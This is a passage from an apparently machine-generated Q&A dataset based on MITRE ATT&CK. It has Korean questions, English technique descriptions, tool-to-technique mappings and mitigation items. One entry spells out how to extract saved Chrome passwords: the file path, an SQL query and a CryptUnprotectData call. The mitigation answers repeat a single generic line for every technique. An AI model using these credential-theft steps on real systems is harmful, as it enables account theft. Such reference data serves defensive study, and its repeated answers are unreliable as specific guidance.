date/time.(Citation: AnyRun TimeBomb)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1124",
        "entity_id": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077"
      }
    },
    {
      "question": "Masquerade Task or Service 공격 기법은 무엇인가?",
      "answer": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1036.004",
        "entity_id": "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c"
      }
    },
    {
      "question": "Asymmetric Cryptography 공격 기법은 무엇인가?",
      "answer": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1573.002",
        "entity_id": "attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada"
      }
    },
    {
      "question": "Credentials from Web Browsers 공격 기법은 무엇인가?",
      "answer": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.  (Citation: Talos Olympic Destroyer 2018) \n\nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1555.003",
        "entity_id": "attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8"
      }
    },
    {
      "question": "Code Signing 공격 기법은 무엇인가?",
      "answer": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1553.002",
        "entity_id": "attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082"
      }
    },
    {
      "question": "Malicious Link 공격 기법은 무엇인가?",
      "answer": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1204.001",
        "entity_id": "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9"
      }
    },
    {
      "question": "Data Encrypted for Impact 공격 기법은 무엇인가?",
      "answer": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)(Citation: Varonis)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation: Halcyon AWS Ransomware 2025)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1486",
        "entity_id": "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0"
      }
    },
    {
      "question": "Process Injection 공격 기법은 무엇인가?",
      "answer": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1055",
        "entity_id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d"
      }
    },
    {
      "question": "Spearphishing Link 공격 기법은 무엇인가?",
      "answer": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
      "difficulty": "easy",
      "type": "attack_pattern_description",
      "metadata": {
        "mitre_id": "T1566.002",
        "entity_id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7"
      }
    },
    {
      "question": "Net 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Net는 Domain Account, SMB/Windows Admin Shares 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--03342581-f790-4f03-ba41-e82e67392e23"
      }
    },
    {
      "question": "RemoteUtilities 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "RemoteUtilities는 Screen Capture, Msiexec 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--03c6e0ea-96d3-4b23-9afb-05055663cf4b"
      }
    },
    {
      "question": "Covenant 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Covenant는 Asymmetric Cryptography, Mshta 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--05fb53c8-e2ac-4e17-a0c9-a0825e1198bf"
      }
    },
    {
      "question": "NPPSPY 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "NPPSPY는 Impersonation, Automated Collection 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--0630d1a7-54da-4a48-a6af-eb8a62b13c17"
      }
    },
    {
      "question": "BloodHound 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "BloodHound는 PowerShell, Domain Trust Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--066b057c-944e-4cfc-b654-e3dfba04b926"
      }
    },
    {
      "question": "certutil 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "certutil는 Ingress Tool Transfer, Deobfuscate/Decode Files or Information 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc"
      }
    },
    {
      "question": "at 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "at는 At 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--0c8465c0-d0b4-4670-992e-4eee8d7ff952"
      }
    },
    {
      "question": "UACMe 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "UACMe는 Bypass User Account Control 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--102c3898-85e0-43ee-ae28-62a0a3ed9507"
      }
    },
    {
      "question": "ShimRatReporter 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "ShimRatReporter는 Process Discovery, Native API 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--115f88dd-0618-4389-83cb-98d33ae81848"
      }
    },
    {
      "question": "Sliver 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Sliver는 System Network Connections Discovery, LSASS Memory 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--11f8d7eb-1927-4806-9267-3a11d4d4d6be"
      }
    },
    {
      "question": "SILENTTRINITY 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "SILENTTRINITY는 Security Software Discovery, System Service Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--1244e058-fa10-48cb-b484-0bcf671107ae"
      }
    },
    {
      "question": "PowerSploit 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "PowerSploit는 LSASS Memory, Domain Trust Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--13cd9151-83b7-410d-9f98-25d0f0d1d80d"
      }
    },
    {
      "question": "Pacu 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Pacu는 Cloud Administration Command, Cloud Account 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--1b3b8f96-43b1-4460-8e02-1f53d7802fb9"
      }
    },
    {
      "question": "Windows Credential Editor 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Windows Credential Editor는 LSASS Memory 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--242f3da3-4425-4d11-8f5c-b842886da966"
      }
    },
    {
      "question": "Impacket 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Impacket는 LSA Secrets, Security Account Manager 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--26c87906-d750-42c5-946c-d4162c73fc7b"
      }
    },
    {
      "question": "ipconfig 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "ipconfig는 System Network Configuration Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--294e2560-bd48-44b2-9da2-833b5588ad11"
      }
    },
    {
      "question": "AADInternals 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "AADInternals는 Exfiltration Over Alternative Protocol, Modify Registry 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--2c5281dd-b5fd-4531-8aea-c1bf8a0f8756"
      }
    },
    {
      "question": "Tasklist 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Tasklist는 Security Software Discovery, System Service Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--2e45723a-31da-4a7e-aaa6-e01998a6788f"
      }
    },
    {
      "question": "ngrok 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "ngrok는 Protocol Tunneling, Web Service 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--2f7f03bb-f367-4a5a-ad9b-310a12a48906"
      }
    },
    {
      "question": "Lslsass 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Lslsass는 LSASS Memory 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--2fab555f-7664-4623-b4e0-1675ae38190b"
      }
    },
    {
      "question": "Arp 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Arp는 System Network Configuration Discovery, Remote System Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--30489451-5886-4c46-90c9-0dff9adc5252"
      }
    },
    {
      "question": "spwebmember 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "spwebmember는 Sharepoint 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--33b9e38f-103c-412d-bdcf-904a91fff1e4"
      }
    },
    {
      "question": "Empire 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Empire는 Native API, Silver Ticket 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3"
      }
    },
    {
      "question": "ifconfig 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "ifconfig는 System Network Configuration Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--362dc67f-4e85-4562-9dac-1b6b7f3ec4b5"
      }
    },
    {
      "question": "FRP 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "FRP는 Web Protocols, Symmetric Cryptography 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--36dd807e-b5bc-4c3e-91ed-80682360148c"
      }
    },
    {
      "question": "dsquery 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "dsquery는 System Information Discovery, Domain Groups 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--38952eac-cb1b-4a71-bad2-ee8223a1c8fe"
      }
    },
    {
      "question": "PcShare 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "PcShare는 Video Capture, Process Injection 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--3a53b207-aba2-4a2b-9cdb-273d633669e7"
      }
    },
    {
      "question": "RawDisk 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "RawDisk는 Data Destruction, Disk Content Wipe 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--3ffbdc1f-d2bf-41ab-91a2-c7b857e98079"
      }
    },
    {
      "question": "netstat 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "netstat는 System Network Connections Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--4664b683-f578-434f-919b-1c1aad2a1111"
      }
    },
    {
      "question": "PoshC2 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "PoshC2는 Password Policy Discovery, Windows Management Instrumentation Event Subscription 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--4b57c098-f043-4da2-83ef-7588a6d426bc"
      }
    },
    {
      "question": "Fgdump 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Fgdump는 Security Account Manager 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--4f45dfeb-fe51-4df0-8db3-edf7dd0513fe"
      }
    },
    {
      "question": "xCmd 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "xCmd는 Service Execution 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--4fa49fc0-9162-4bdb-a37e-7aa3dcb6d38b"
      }
    },
    {
      "question": "CSPY Downloader 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "CSPY Downloader는 Indicator Removal, System Checks 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--5256c0f8-9108-4c92-8b09-482dfacdcd94"
      }
    },
    {
      "question": "Rclone 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Rclone는 Exfiltration Over Unencrypted Non-C2 Protocol, Archive via Utility 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--59096109-a1dd-463b-87e7-a8d110fe3a79"
      }
    },
    {
      "question": "MimiPenguin 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "MimiPenguin는 Proc Filesystem 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--5a33468d-844d-4b1f-98c9-0e786c556b27"
      }
    },
    {
      "question": "netsh 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "netsh는 Security Software Discovery, Proxy 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--5a63f900-5e7e-4928-a746-dd4558e1df71"
      }
    },
    {
      "question": "CARROTBALL 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "CARROTBALL는 Obfuscated Files or Information, Malicious File 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--5fc81b43-62b5-41b1-9113-c79ae5f030c4"
      }
    },
    {
      "question": "BITSAdmin 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "BITSAdmin는 BITS Jobs, Ingress Tool Transfer 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--64764dc6-a032-495f-8250-1e4c06bdc163"
      }
    },
    {
      "question": "meek 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "meek는 Domain Fronting 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--65370d0b-3bd4-4653-8cf9-daf56f6be830"
      }
    },
    {
      "question": "AsyncRAT 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "AsyncRAT는 Scheduled Task, Keylogging 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--6a5947f3-1a36-4653-8734-526df3e1d28d"
      }
    },
    {
      "question": "ROADTools 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "ROADTools는 Cloud Accounts, Cloud Groups 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--6dbdc657-d8e0-4f2f-909b-7251b3e72c6d"
      }
    },
    {
      "question": "Brute Ratel C4 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Brute Ratel C4는 Web Protocols, Malicious File 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--75d8b521-6b6a-42ff-8af3-d97e20ce12a5"
      }
    },
    {
      "question": "Peirates 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Peirates는 Steal Application Access Token, Cloud Accounts 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--79dd477a-8226-4b3d-ad15-28623675f221"
      }
    },
    {
      "question": "Remcos 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Remcos는 Audio Capture, File and Directory Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--7cd0bc75-055b-4098-a00e-83dc8beaff14"
      }
    },
    {
      "question": "Systeminfo 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Systeminfo는 System Information Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--7fcbc4e8-1989-441f-9ac5-e7b6ff5806f1"
      }
    },
    {
      "question": "Out1 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Out1는 Local Email Collection, Data from Local System 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--80c815bb-b24a-4b9c-9d73-ff4c075a278d"
      }
    },
    {
      "question": "ConnectWise 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "ConnectWise는 Screen Capture, PowerShell 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--842976c7-f9c8-41b2-8371-41dc64fbe261"
      }
    },
    {
      "question": "attrib 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "attrib는 Hidden Files and Directories 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--8c6e9947-f7b1-4bd3-9d5d-cc7d39934989"
      }
    },
    {
      "question": "Imminent Monitor 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Imminent Monitor는 Disable or Modify Tools, File and Directory Discovery 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--8f8cd191-902c-4e83-bf20-b57c8c4640e9"
      }
    },
    {
      "question": "Ruler 도구는 어떤 공격 기법에 사용되는가?",
      "answer": "Ruler는 Email Account, Outlook Home Page 등의 공격 기법에 사용된다.",
      "difficulty": "easy",
      "type": "tool_usage",
      "metadata": {
        "entity_id": "tool--90ac9266-68ce-46f2-b24f-5eb3b2a8ea38"
      }
    },
    {
      "question": "DNS 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Protocol or Service Impersonation 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "One-Way Communication 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Non-Standard Port 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Data from Configuration Repository 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Publish/Subscribe Protocols 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--241f9ea8-f6ae-4f38-92f5-cef5b7e539dd",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Encrypted Channel 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Web Protocols 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Standard Encoding 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "TFTP Boot 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Exfiltration Over Unencrypted Non-C2 Protocol 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "External Proxy 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Protocol Tunneling 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Fallback Channels 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
        "attack_id": "attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433",
        "mitigation": "Network Intrusion Prevention"
      }
    },
    {
      "question": "Malicious Library 공격에 대한 대응 방안은 무엇인가?",
      "answer": "Use intrusion detection signatures to block traffic at network boundaries.",
      "difficulty": "easy",
      "type": "mitigation",
      "metadata": {
